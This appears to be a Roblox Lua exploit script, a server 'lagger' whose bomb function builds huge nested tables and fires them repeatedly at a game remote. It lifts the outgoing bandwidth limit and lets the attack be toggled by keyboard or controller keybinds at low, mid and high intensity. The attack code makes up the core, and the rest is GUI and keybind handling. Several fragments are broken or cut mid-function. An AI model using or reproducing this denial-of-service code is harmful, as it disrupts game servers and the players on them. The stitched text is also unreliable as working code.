local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
	if not path or path == "" then return nil end
	local obj = game
	local cleaned = path:gsub("^game%.", "")
	for segment in cleaned:gmatch("[^%.]+") do
		if obj then
			obj = obj[segment]
		else
			return nil
		end
	end
	return obj
end

local function getmaxvalue(val)
	local mainvalueifonetable = 499999
	if type(val) ~= "number" then return nil end
	return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
	local maintable = {}
	local spammedtable = {}
	table.insert(spammedtable, {})
	local z = spammedtable[1]
	for i = 1, tableincrease do
		local tableins = {}
		table.insert(z, tableins)
		z = tableins
	end
	local maximum = getmaxvalue(tableincrease) or 9999999
	for i = 1, maximum do
		table.insert(maintable, spammedtable)
		if i % 5000 == 0 then task.wait() end
	end
	local remote = resolveRemote(CUSTOM_REMOTE_PATH)
	if remote then
		for i = 1, tries do
			pcall(function()
				if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
					remote:FireServer(maintable)
				elseif remote:IsA("RemoteFunction") then
					remote:InvokeServer(maintable)
				end
			end)
		end
	end
end

local laggerEnabled = false
local laggerThread  = nil
local currentConfig = INTENSITY_CONFIG["high"]

local function startLaggerLoop()
	while laggerEnabled do
		pcall(function()
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
		end)
		task.spawn(function()
			bomb(currentConfig.TableIncrease, currentConfig.Tries)
		end)
		task.wait(math.max(currentConfig.LoopWaitTime, 0.05))
	end
end

local function stopLaggerLoop()
	laggerEnabled = false
	if laggerThread then
		pcall(function() coroutine.close(laggerThread) end)
		laggerThread = nil
	end
end

local function startLagger()
	if laggerThread then return end
	laggerEnabled = true
	laggerThread  = coroutine.create(startLaggerLoop)
	coroutine.resume(laggerThread)
end

local function restartLagger()
	stopLaggerLoop()
	startLagger()
end

-- DRAGGABLE
-- ============================================================
local function makeDraggable(frame, handle)
	local src = handle or frame
	local dragging, dragStart, startPos = false, nil, nil
	local dragInput = nil

	src.InputBegan:Connect(function(inp)
		if State.lockGui then return end
		if inp.UserInputType == Enum.UserInputType.MouseButton1
			or inp.UserInputType == Enum.UserInputType.Touch then
			dragging  = true
			dragStart = inp.Position
			startPos  = frame.Position
			inp.Changed:Connect(function()
				if inp.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	src.InputChanged:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseMovement
			or inp.UserInputType == Enum.UserInputType.Touch then
			dragInput = inp
		end
	end)

	UIS.InputChanged:Connect(function(inp)
		if inp == dragInput and dragging and not State.lockGui then
			local d = inp.Position - dragStart
			frame.Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + d.X,
				startPos.Y.Scale, startPos.Y.Offset + d.Y
			)
		end
	end)
end

-- KEYBIND NAME HELPER - FULL CONTROLLER SUPPORT
-- ============================================================
local function getKeyName(bind)
	if not bind or bind.value == Enum.KeyCode.Unknown then 
		return "none" 
	end
	
	if bind.type == "keyboard" then
		local n = bind.value.Name
		if n == "Unknown" then return "none" end
		if n == "LeftControl" then return "ctrl" end
		if n == "LeftShift" then return "shift" end
		if n == "Space" then return "space" end
		return n:lower()
	elseif bind.type == "gamepad" then
		local n = bind.value.Name
		-- Standard gamepad buttons
		if n == "Gamepad1" then return "a" end
		if n == "Gamepad2" then return "b" end
		if n == "Gamepad3" then return "x" end
		if n == "Gamepad4" then return "y" end
		if n == "GamepadLeftShoulder" then return "lb" end
		if n == "GamepadRightShoulder" then return "rb" end
		if n == "GamepadLeftTrigger" then return "lt" end
		if n == "GamepadRightTrigger" then return "rt" end
		if n == "GamepadDpadDown" then return "d-down" end
		if n == "GamepadDpadUp" then return "d-up" end
		if n == "GamepadDpadLeft" then return "d-left" end
		if n == "GamepadDpadRight" then return "d-right" end
		if n == "GamepadButton1" then return "btn1" end
		if n == "GamepadButton2" then return "btn2" end
		if n == "GamepadButton3" then return "btn3" end
		if n == "GamepadButton4" then return "btn4" end
		if n == "GamepadButton5" then return "btn5" end
		if n == "GamepadButton6" then return "btn6" end
		if n == "GamepadButton7" then return "btn7" end
		if n == "GamepadButton8" then return "btn8" end
		if n == "GamepadButton9" then return "btn9" end
		if n == "GamepadButton10" then return "btn10" end
		if n == "GamepadButton11" then return "btn11" end
		if n == "GamepadButton12" then return "btn12" end
		if n == "GamepadButton13" then return "btn13" end
		if n == "GamepadButton14" then return "btn14" end
		if n == "GamepadButton15" then return "btn15" end
		if n == "GamepadButton16" then return "btn16" end
		if n == "GamepadLeftThumbstick" then return "ls" end
		if n == "GamepadRightThumbstick" then return "rs" end
		if n == "GamepadSelect" then return "select" end
		if n == "GamepadStart" then return "start" end
		if n == "GamepadMenu" then return "menu" end
		if n == "GamepadView" then return "view" end
		return n:lower()
	end
	
	return "none"
end

	if lkConnToggle then lkConnToggle:Disconnect(); lkConnToggle = nil end
	toggleBindBtn.TextColor3 = C.bindText
	
	if inputType and inputValue then
		Binds.toggle.type = inputType
		Binds.toggle.value = inputValue
		toggleBindBtn.Text = getKeyName(Binds.toggle)
	else
		Binds.toggle.type = "keyboard"
		Binds.toggle.value = Enum.KeyCode.Unknown
		toggleBindBtn.Text = "none"
	end
end

	if listeningToggle then stopListenToggle(nil, nil); return end
	listeningToggle          = true
	toggleBindBtn.Text       = "..."
	toggleBindBtn.TextColor3 = C.text
	lkConnToggle = UIS.InputBegan:Connect(function(inp, gp)
		if gp or not listeningToggle then return end
		
		-- Keyboard input
		if inp.UserInputType == Enum.UserInputType.Keyboard then
			if inp.KeyCode == Enum.KeyCode.Escape then 
				stopListenToggle(nil, nil)
				return 
			end
			stopListenToggle("keyboard", inp.KeyCode)
		end
		
		-- Gamepad input - detect specific button presses
		if inp.UserInputType == Enum.UserInputType.Gamepad1 or 
		   inp.UserInputType == Enum.UserInputType.Gamepad2 or
		   inp.UserInputType == Enum.UserInputType.Gamepad3 or
		   inp.UserInputType == Enum.UserInputType.Gamepad4 then
			stopListenToggle("gamepad", inp.UserInputType)
		end
	end)
end)

	bindBtn.TextColor3       = C.bindText
	bindBtn.Font             = Enum.Font.GothamBold
	bindBtn.TextSize         = 11
	bindBtn.ZIndex           = 3
	mkCorner(bindBtn, 5)
	mkStroke(bindBtn, C.border, 1)

	local listening = false
	local lkConn   = nil

	local function stopListen(inputType, inputValue)
		listening          = false
		if lkConn then lkConn:Disconnect(); lkConn = nil end
		bindBtn.TextColor3 = C.bindText
		
		if inputType and inputValue then
			Binds[bindKey].type = inputType
			Binds[bindKey].value = inputValue
			bindBtn.Text = getKeyName(Binds[bindKey])
		else
			Binds[bindKey].type = "keyboard"
			Binds[bindKey].value = Enum.KeyCode.Unknown
			bindBtn.Text = "none"
		end
	end

	bindBtn.MouseButton1Click:Connect(function()
		if listening then stopListen(nil, nil); return end
		listening          = true
		bindBtn.Text       = "..."
		bindBtn.TextColor3 = C.text
		lkConn = UIS.InputBegan:Connect(function(inp, gp)
			if gp or not listening then return end
			
			-- Keyboard input
			if inp.UserInputType == Enum.UserInputType.Keyboard then
				if inp.KeyCode == Enum.KeyCode.Escape then 
					stopListen(nil, nil)
					return 
				end
				stopListen("keyboard", inp.KeyCode)
			end
			
			-- Gamepad input - detect specific button presses
			if inp.UserInputType == Enum.UserInputType.Gamepad1 or 
			   inp.UserInputType == Enum.UserInputType.Gamepad2 or
			   inp.UserInputType == Enum.UserInputType.Gamepad3 or
			   inp.UserInputType == Enum.UserInputType.Gamepad4 then
				stopListen("gamepad", inp.UserInputType)
			end
		end)
	end)

	bindBtn.MouseButton2Click:Connect(function()
		listening      = false
		if lkConn then lkConn:Disconnect(); lkConn = nil end
		Binds[bindKey].type = "keyboard"
		Binds[bindKey].value = Enum.KeyCode.Unknown
		bindBtn.Text = "none"
		bindBtn.TextColor3 = C.bindText
	end)

	bindRows[bindKey] = bindBtn
	return row
end

makeBindRow("LOW KEYBIND",  "low",  5)
makeBindRow("MID KEYBIND",  "mid",  6)
makeBindRow("HIGH KEYBIND", "high", 7)

-- ============================================================
-- KEYBIND TOGGLE FUNCTION
-- ============================================================
local function toggleLaggerWithKey(intensityName)
	if State.laggerOn then
		setLaggerState(false)
	else
		setIntensity(intensityName:lower())
		setLaggerState(true)
	end
end

-- ============================================================
-- LOGIC: STATUS
-- ============================================================
local function updateStatus()
	if State.laggerOn then
		statusLbl.Text       = "ON"
		statusLbl.TextColor3 = Color3.fromRGB(120, 220, 120)
	else
		statusLbl.Text       = "OFF"
		statusLbl.TextColor3 = C.textDim
	end
end

-- ============================================================
-- LOGIC: SET INTENSITY
-- ============================================================
local function setIntensity(name)
	State.intensity = name
	currentConfig   = INTENSITY_CONFIG[name]

	for n, btn in pairs(intensityBtns) do
		local btnName = n:lower()
		if btnName == name then
			btn.BackgroundColor3 = C.btnActive
			btn.TextColor3       = C.bg
		else
			btn.BackgroundColor3 = C.btnIdle
			btn.TextColor3       = C.textSub
		end
	end

	if State.laggerOn then
		restartLagger()
	end
end

-- ============================================================
-- LOGIC: TOGGLE LAGGER
-- ============================================================
local function setLaggerState(on)
	State.laggerOn = on
	setLagPill(on)
	updateStatus()
	if on then
		currentConfig = INTENSITY_CONFIG[State.intensity]
		startLagger()
	else
		stopLaggerLoop()
	end
end

	end)
end

-- ============================================================
-- LOGIC: KEYBIND HOTKEYS (Supports both keyboard and controller)
-- ============================================================
UIS.InputBegan:Connect(function(inp, gp)
	if gp then return end
	
	-- Check for keyboard inputs
	if inp.UserInputType == Enum.UserInputType.Keyboard then
		local kc = inp.KeyCode
		
		-- Check main toggle keybind first
		if Binds.toggle.type == "keyboard" and Binds.toggle.value ~= Enum.KeyCode.Unknown and kc == Binds.toggle.value then
			setLaggerState(not State.laggerOn)
			return
		end
		
		-- Check intensity keybinds
		for bindName, bind in pairs(Binds) do
			if bindName ~= "toggle" and bind.type == "keyboard" and bind.value ~= Enum.KeyCode.Unknown and kc == bind.value then
				toggleLaggerWithKey(bindName)
			end
		end
	end
	
	-- Check for gamepad inputs
	if inp.UserInputType == Enum.UserInputType.Gamepad1 or 
	   inp.UserInputType == Enum.UserInputType.Gamepad2 or
	   inp.UserInputType == Enum.UserInputType.Gamepad3 or
	   inp.UserInputType == Enum.UserInputType.Gamepad4 then
		
		local inputType = inp.UserInputType
		
		-- Check main toggle keybind first
		if Binds.toggle.type == "gamepad" and Binds.toggle.value ~= Enum.KeyCode.Unknown and inputType == Binds.toggle.value then
			setLaggerState(not State.laggerOn)
			return
		end
		
		-- Check intensity keybinds
		for bindName, bind in pairs(Binds) do
			if bindName ~= "toggle" and bind.type == "gamepad" and bind.value ~= Enum.KeyCode.Unknown and inputType == bind.value then
				toggleLaggerWithKey(bindName)
			end
		end
	end
end)
